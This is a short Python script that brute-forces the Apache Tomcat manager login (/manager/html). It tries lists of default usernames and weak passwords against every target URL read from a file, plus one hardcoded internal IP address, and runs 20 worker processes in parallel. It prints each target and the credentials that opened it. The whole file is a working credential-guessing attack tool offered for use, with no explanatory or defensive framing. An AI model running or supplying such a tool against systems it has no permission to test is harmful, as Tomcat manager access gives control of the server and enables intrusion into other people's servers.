#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'JeeWin'

import requests as req
import sys
from multiprocessing import Pool
import re

def brute_force(target):
    unames = ['tomcat', 'admin', 'role1']
    pwds = ['123456', '12345', 'tomcat', 'tomcat123']
    url = target + '/manager/html'

    for uname in unames:
        for pwd in pwds:
            try:
                response = req.get(url, auth=(uname, pwd), timeout=5)
            except Exception as e:
                print url, e
                return

            if response.status_code == 200:
                s = re.findall(r".*Tomcat.*", response.content)
                if s:
                    print url, '@', uname, pwd


if __name__ == '__main__':

    urls = []
    for line in open(sys.argv[1]):
        line = line.strip()
        urls.append(line)

    urls.append('http://10.223.2.60:9090')
    #print urls
    pool = Pool(20)
    pool.map(brute_force, urls)
    pool.close()
    pool.join()
